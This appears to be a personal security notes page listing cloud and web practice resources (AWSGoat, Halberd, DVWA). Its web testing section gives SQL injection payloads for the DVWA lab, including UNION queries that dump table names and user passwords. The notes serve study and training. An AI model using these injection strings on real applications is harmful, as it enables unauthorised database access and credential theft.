---
Owner: Chris Adams
date: 
tags:
  - cloud
  - cloud-sec
  - github
layout: github
draft:
---

## Cloud Security

---
[[Detection Tools]]
[[Cloud Monitoring]]
### AWS

### **AWSGoat : A Damn Vulnerable AWS Infrastructure**

https://github.com/ine-labs/AWSGoat

![[quartz/content/img/awsgoat.png]]


### Halberd

[https://github.com/vectra-ai-research/Halberd](https://github.com/vectra-ai-research/Halberd)

- Halberd is an open-source security testing tool to proactively assess cloud threat detection by executing a comprehensive array of attack techniques across multiple surfaces.
- Leveraging Halberd, security teams can very quickly & easily execute attack techniques to generate telemetry and validate their detection & response capabilities via a simple intuitive web application.

_Evaluate defenses across multiple attack surfaces, including [Entra ID](https://learn.microsoft.com/en-us/entra/identity/), [M365](https://learn.microsoft.com/en-us/microsoft-365/?view=o365-worldwide), [Azure](https://learn.microsoft.com/en-us/azure/?product=popular) and [AWS](https://docs.aws.amazon.com/)._
![[quartz/content/img/halberd.png]]

---

## Web Application Testing

---

**Vulnerable Web App**

**THM**: [https://tryhackme.com/room/dvwa](https://tryhackme.com/room/dvwa)

**GitHub**: [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)

**Kali packages:** [https://www.kali.org/tools/dvwa/](https://www.kali.org/tools/dvwa/)

**SourceForge**: [https://sourceforge.net/projects/dvwa.mirror/](https://sourceforge.net/projects/dvwa.mirror/)

- **DVWA** (Damn Vulnerable Web Application)
    - PHP/MySQL web application for practice
- **SQL Injection**
    - localhost/dvwa
        - ‘ or ‘1’ = ‘1
            - displays all users and surname
        - ‘ union select @@version, null #
            - display database version
        - ‘ and 1 = 0 union select null, table_name from information_schema.tables #
            - displays all tables in information_schema
        - %’ and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #


---
Link to other Github repos on this site: [[GitHub Resources Index]]